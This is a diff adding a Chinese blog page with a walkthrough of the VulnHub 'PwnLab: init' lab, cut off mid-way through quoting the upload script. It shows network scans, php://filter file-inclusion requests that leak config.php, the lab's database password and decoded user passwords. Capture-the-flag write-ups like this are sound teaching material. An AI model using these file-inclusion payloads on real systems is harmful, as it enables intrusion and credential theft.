@@ -1,0 +1,1008 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是一个来自 VulnHub 的靶机项目。 **靶机地址：**https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;pwnlab-init,158&#x2F; **难度级别：**Low 注：flag位于&#x2F;root&#x2F;flag.tx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub pwnlab_init">
+<meta property="og:url" content="http://example.com/2026/test43/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是一个来自 VulnHub 的靶机项目。 **靶机地址：**https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;pwnlab-init,158&#x2F; **难度级别：**Low 注：flag位于&#x2F;root&#x2F;flag.tx">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200579.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200349.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202492.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200823.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200951.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200981.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202661.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201609.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201292.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201180.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202127.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201299.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201518.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201559.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202949.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201936.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202951.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201320.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201079.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201202.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201252.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201696.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203483.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203016.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201895.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201257.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201683.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152201582.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202477.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202382.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202175.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202842.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202227.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202773.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202396.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202972.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202238.png">
+<meta property="article:published_time" content="2026-04-15T10:16:02.844Z">
+<meta property="article:modified_time" content="2026-04-15T14:03:07.366Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200579.png">
+  
+  
+  
+  <title>vulnhub pwnlab_init - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub pwnlab_init"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnhub pwnlab_init</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p>这是一个来自 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/">VulnHub</a> 的靶机项目。</p>
+<p>**靶机地址：**<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a></p>
+<p>**难度级别：**Low</p>
+<p>注：flag位于&#x2F;root&#x2F;flag.txt</p>
+<p><strong>靶机描述：</strong></p>
+<blockquote>
+<p>Wellcome to “PwnLab: init”, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.</p>
+<p>欢迎来到“PwnLab: init”，这是我的第一个 Boot2Root 虚拟机。它旨在简单易上手，希望您玩得开心，并能从中有所收获。本次 CTF 的目标是获取 root 权限并读取 flag。</p>
+</blockquote>
+<p>由于是课程作业，要求复现WP，所以本靶机我们将进行两轮攻击：</p>
+<ol>
+<li>第一轮：复现 Writeup（WP）的方法操作，完成课程要求。</li>
+<li>第二轮：结合自身理解与技巧，尝试更高效或独特的解决方案。</li>
+</ol>
+<h1 id="第一轮"><a href="#第一轮" class="headerlink" title="第一轮"></a>第一轮</h1><blockquote>
+<p>这一轮复现WP，解题步骤及描述仅作简单调整</p>
+</blockquote>
+<p>首先不知道靶机的IP，我们要进行一下目标探测。netdiscover （kali自带的基于ARP协议的网段扫描工具）</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdiscover</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200579.png" srcset="/img/loading.gif" lazyload alt="image-20251211162826125"></p>
+<p>这时候已经知道了目标的IP了。</p>
+<p>信息收集，对它进行端口扫描，敏感目录、敏感文件扫描。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">p</span>- -<span class="hljs-selector-tag">A</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.130</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200349.png" srcset="/img/loading.gif" lazyload alt="image-20251211163011346"></p>
+<p>发现对方开放80web端口、3306mysql端口和RPC服务</p>
+<p>先去80端口搞一波，看一下主页有三个选项：主页，登录和上传。</p>
+<p>直接去上传功能的位置发现想上传必须要登陆，不是未授权访问的页面。 要登陆就需要账号密码，所以暂时搁置等其他线索。注意的一点是，在登陆以及上传的位置可能存在文件包含。就看这个参数有没有过滤，客户端 对这个可不可控。但是就算可能存在文件包含但是也有一个问题。在于有什么文件可以进行包含。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202492.png" srcset="/img/loading.gif" lazyload alt="image-20251211163203856"></p>
+<p>扫一扫路径下都有什么文件。找到有upload文件夹以及upload.php文件还有 config.php和index.php。这些文件：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200823.png" srcset="/img/loading.gif" lazyload alt="image-20251211163605651"></p>
+<p>现在再去判断一下是否存在我们刚才猜测的文件包含的问题。文件包含有很多协议。用其中的filter协议去看能否读出文件源码。（这里演示一下存在的带有后缀和不带后缀的问题）观察原本的结构也是不带有文件后缀的。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64encode/resource=config.php （错误）<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=config （正确）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200951.png" srcset="/img/loading.gif" lazyload alt="image-20251211163659983"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$server</span>	  = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;H4u%QJ_H99&quot;</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-string">&quot;Users&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得出重要信息。得到了数据库的账号以及密码。同时结合刚刚在扫描端口 哪里发现了对方是开发3306mysql端口的所以。我们的突破点来了。去连接对方的数据库在里面有什么内容。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200981.png" srcset="/img/loading.gif" lazyload alt="image-20251211164007110"></p>
+<p>突破点来了，有三组账号，且对方的前端是存在登录页面的。而且是可以传文件的。三组账号是加密的但是可以很清楚的判定为base64加密，解密得到明文。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kent | <span class="hljs-attribute">Sld6WHVCSkpOeQ</span>==<br>mike | <span class="hljs-attribute">U0lmZHNURW42SQ</span>==<br>kane | <span class="hljs-attribute">aVN2NVltMkdSbw</span>==<br><br>Kent: JWzXuBJJNy<br>Mike: SIfdsTEn6I<br>Kane: iSv5Ym2GRo<br></code></pre></td></tr></table></figure>
+
+<p>可以上传文件了，因为现在有账号密码了。不出意外，不是任意文件上传。这个时候可以白盒也可以黑盒。因为有文件包含漏洞。可以去包含 upload.php去看源码有什么限制。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=upload<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202661.png" srcset="/img/loading.gif" lazyload alt="image-20251211164216939"></p>
+<p>允许.jpg”,”.jpeg”,”.gif”,”.png。检查文件头以及白名单后缀名以及mime类 型，上传后将文件名字重新命名。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You must be log in.&#x27;</span>); &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&#x27;post&#x27;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&#x27;multipart/form-data&#x27;</span>&gt;</span></span><br><span class="language-xml">			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;file&#x27;</span> /&gt;</span></span><br><span class="language-xml">			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;submit&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;submit&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;Upload&#x27;</span>/&gt;</span></span><br><span class="language-xml">		<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="language-php">	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] &lt;= <span class="hljs-number">0</span>) &#123;</span><br><span class="language-php">		<span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-variable">$filetype</span>  = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;upload/&#x27;</span>;</span><br><span class="language-php">		<span class="hljs-variable">$file_ext</span>  = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>);</span><br><span class="language-php">		<span class="hljs-variable">$imageinfo</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="language-php">		<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.jpeg&quot;</span>,<span class="hljs-string">&quot;.gif&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>); </span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$whitelist</span>))) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filetype</span>,<span class="hljs-string">&#x27;image&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 001&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="hljs-variable">$imageinfo</span>[<span class="hljs-string">&#x27;mime&#x27;</span>] != <span class="hljs-string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 002&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$filetype</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&gt;<span class="hljs-number">1</span>)&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 003&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])).<span class="hljs-variable">$file_ext</span>;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>)) &#123;</span><br><span class="language-php">			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$uploadfile</span>.<span class="hljs-string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="language-php">		&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error 4&#x27;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">	&#125;</span><br><span 